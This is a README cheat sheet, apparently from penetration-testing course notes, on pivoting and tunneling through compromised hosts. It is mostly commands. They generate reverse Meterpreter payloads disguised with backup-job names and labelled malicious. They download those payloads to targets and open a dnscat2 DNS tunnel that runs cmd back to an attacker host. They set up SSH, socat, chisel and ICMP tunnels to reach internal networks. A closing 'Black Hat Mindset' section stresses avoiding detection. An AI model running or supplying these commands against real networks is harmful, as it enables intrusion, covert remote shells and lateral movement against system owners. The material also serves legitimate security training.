# Basic Methodology - Pivoting and Tunneling

This README explores techniques for pivoting through compromised hosts and tunneling traffic to access internal networks or bypass restrictions.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Network Enumeration](#network-enumeration)
- [SSH Local Port Forwarding](#ssh-local-port-forwarding)
- [SSH Dynamic Port Forwarding (SOCKS Proxy)](#ssh-dynamic-port-forwarding-socks-proxy)
- [Using Proxychains for Traffic Routing](#using-proxychains-for-traffic-routing)
- [Pivoting with Metasploit](#pivoting-with-metasploit)
- [File Transfers and Payload Execution](#file-transfers-and-payload-execution)
- [SSH Reverse Port Forwarding](#ssh-reverse-port-forwarding)
- [SOCKS Proxies with Metasploit and Meterpreter](#socks-proxies-with-metasploit-and-meterpreter)
- [Tunneling with Socat](#tunneling-with-socat)
- [Dynamic Port Forwarding with Plink (Windows)](#dynamic-port-forwarding-with-plink-windows)
- [Routing with SSHuttle](#routing-with-sshuttle)
- [Reverse Pivoting with rpivot](#reverse-pivoting-with-rpivot)
- [DNS Tunneling with dnscat2](#dns-tunneling-with-dnscat2)
- [Tunneling with Chisel](#tunneling-with-chisel)
- [ICMP Tunneling with ptunnel-ng](#icmp-tunneling-with-ptunnel-ng)
- [SOCKS over RDP (Windows)](#socks-over-rdp-windows)
- [Port Forwarding with netsh (Windows)](#port-forwarding-with-netsh-windows)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Pivoting and tunneling allow attackers to navigate through networks by routing traffic via compromised hosts, accessing internal systems, and bypassing firewalls. This guide covers network enumeration, SSH tunneling, SOCKS proxies, Metasploit pivoting, and advanced techniques using tools like chisel, ptunnel-ng, and dnscat2.

## Setup and Prerequisites

### Environment
- Linux host for most commands
- Windows host for specific commands (e.g., netsh, plink)

### Tools
Install:
- nmap
- netstat
- proxychains
- metasploit-framework
- msfvenom
- python3
- scp
- socat
- plink (PuTTY)
- sshuttle
- chisel
- ptunnel-ng
- dnscat2
- firefox-esr
- regsvr32

### Files
- `backupscript.exe`, `backupjob`: Malicious payloads
- `/etc/proxychains.conf`: Configure SOCKS proxy settings

### Credentials
- Have usernames and passwords ready (e.g., ubuntu, victor:pass@123)

### IP Addresses
- Identify target IPs (e.g., <IPaddressofTarget>, <IPaddressofAttackHost>)

## Network Enumeration

Gather network information to identify pivot points.

```bash
# Display network configurations
ifconfig                    # Linux
ipconfig                    # Windows

# Show IPv4 routing table
netstat -r                  # Linux/Windows

# Scan target for open SSH and MySQL ports
nmap -sT -p22,3306 <IPaddressofTarget>

# Linux loop to discover hosts in 172.16.5.0/24
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

# Windows loop to discover hosts in 172.16.5.0/24
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# PowerShell one-liner to ping 172.16.5.1-254
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

## SSH Local Port Forwarding

Forward local traffic to a remote service via SSH.

```bash
# Forward local port 1234 to localhost:3306 on target
ssh -L 1234:localhost:3306 ubuntu@<IPaddressofTarget>

# Forward multiple ports
ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>

# Verify tunnel on port 1234
netstat -antp | grep 1234

# Scan forwarded port
nmap -v -sV -p1234 localhost
```

## SSH Dynamic Port Forwarding (SOCKS Proxy)

Create a SOCKS proxy via SSH.

```bash
# Set up SOCKS proxy on port 9050
ssh -D 9050 ubuntu@<IPaddressofTarget>

# Verify SOCKS configuration
tail -4 /etc/proxychains.conf

# Add to /etc/proxychains.conf:
# socks4 127.0.0.1 9050
# or
# socks5 127.0.0.1 1080
```

## Using Proxychains for Traffic Routing

Route traffic through a SOCKS proxy.

```bash
# Ping scan via Proxychains
proxychains nmap -v -sn 172.16.5.1-200

# TCP connect scan via Proxychains
proxychains nmap -v -Pn -sT 172.16.5.19

# Open Metasploit via Proxychains
proxychains msfconsole

# RDP connection via Proxychains
proxychains xfreerdp /v:<IPaddressofTarget> /u:victor /p:pass@123

# Web browsing via Proxychains
proxychains firefox-esr <IPaddressofTargetWebServer>:80
```

## Pivoting with Metasploit

Use Metasploit for pivoting and scanning.

```bash
# Search for RDP scanner module
msf6 > search rdp_scanner

# Set up SOCKS proxy server
msf6 > use auxiliary/server/socks_proxy

# List running jobs
msf6 auxiliary(server/socks_proxy) > jobs

# Set up routing through Meterpreter session
msf6 > use post/multi/manage/autoroute

# Perform ping sweep
msf6 > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

## File Transfers and Payload Execution

Generate, transfer, and execute payloads.

```bash
# Create Windows Meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

# Create Linux Meterpreter payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost> -f elf -o backupjob LPORT=8080

# Set up handler
msf6 > use exploit/multi/handler

# Transfer file via SCP
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

# Start HTTP server
python3 -m http.server 8123

# Download file on Windows target
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

## SSH Reverse Port Forwarding

Forward remote traffic to the attack host.

```bash
# Create reverse SSH tunnel
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN
```

## SOCKS Proxies with Metasploit and Meterpreter

Set up port forwarding with Meterpreter.

```bash
# Display portfwd options
meterpreter > help portfwd

# Forward local port to RDP
meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>

# Connect to forwarded RDP port
xfreerdp /v:localhost:3300 /u:victor /p:pass@123

# Set up reverse port forwarding
meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>

# Background Meterpreter session
meterpreter > bg
```

## Tunneling with Socat

Relay traffic using socat.

```bash
# Forward to attack host
socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80

# Forward to target
socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443
```

## Dynamic Port Forwarding with Plink (Windows)

Set up a SOCKS proxy on Windows.

```bash
# Create SOCKS proxy with plink
plink -D 9050 ubuntu@<IPaddressofTarget>
```

## Routing with SSHuttle

Route traffic through an SSH tunnel.

```bash
# Install sshuttle
sudo apt-get install sshuttle

# Route traffic
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v
```

## Reverse Pivoting with rpivot

Set up reverse pivoting with rpivot.

```bash
# Clone rpivot repository
sudo git clone https://github.com/klsecservices/rpivot.git

# Install Python 2.7
sudo apt-get install python2.7

# Start rpivot server
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Transfer rpivot to target
scp -r rpivot ubuntu@<IPaddressOfTarget>

# Run rpivot client
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

# Connect via NTLM proxy
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

## DNS Tunneling with dnscat2

Tunnel traffic over DNS.

```bash
# Clone dnscat2 repository
git clone https://github.com/iagox86/dnscat2.git

# Start dnscat2 server
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

# Clone dnscat2-powershell repository
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# Import PowerShell module
Import-Module dnscat2.ps1

# Connect to dnscat2 server
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd

# List dnscat2 options
dnscat2> ?

# Interact with session
dnscat2> window -i 1
```

## Tunneling with Chisel

Set up a SOCKS proxy with chisel.

```bash
# Start chisel server
./chisel server -v -p 1234 --socks5

# Connect to chisel server
./chisel client -v 10.129.202.64:1234 socks
```

## ICMP Tunneling with ptunnel-ng

Tunnel traffic over ICMP.

```bash
# Clone ptunnel-ng repository
git clone https://github.com/utoni/ptunnel-ng.git

# Build ptunnel-ng
sudo ./autogen.sh

# Start ptunnel-ng server
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Connect to server
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# Use ICMP tunnel for SSH
ssh -p2222 -lubuntu 127.0.0.1
```

## SOCKS over RDP (Windows)

Set up SOCKS over RDP.

```powershell
# Register SocksOverRDP-Plugin
regsvr32.exe SocksOverRDP-Plugin.dll

# Verify SOCKS proxy
netstat -antb | findstr 1080
```

## Port Forwarding with netsh (Windows)

Configure port forwarding on Windows.

```powershell
# Forward port 8080 to RDP
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25

# Display portproxy rules
netsh.exe interface portproxy show v4tov4
```

## Black Hat Mindset

- **Enumerate Networks**: Identify pivot points and internal hosts with nmap, netstat, and ping sweeps
- **Tunnel Traffic**: Use SSH, chisel, and dnscat2 to bypass firewalls and access internal systems
- **Pivot Strategically**: Leverage Metasploit, SOCKS proxies, and reverse tunnels to maintain access
- **Stay Silent**: Route traffic through legitimate protocols (SSH, DNS) to avoid detection

## Resources

- [SSH Manual](https://www.openssh.com/manual.html)
- [Metasploit Documentation](https://docs.metasploit.com/)
- [Proxychains GitHub](https://github.com/haad/proxychains)
- [Chisel GitHub](https://github.com/jpillora/chisel)
- [dnscat2 GitHub](https://github.com/iagox86/dnscat2)
- [ptunnel-ng GitHub](https://github.com/utoni/ptunnel-ng)

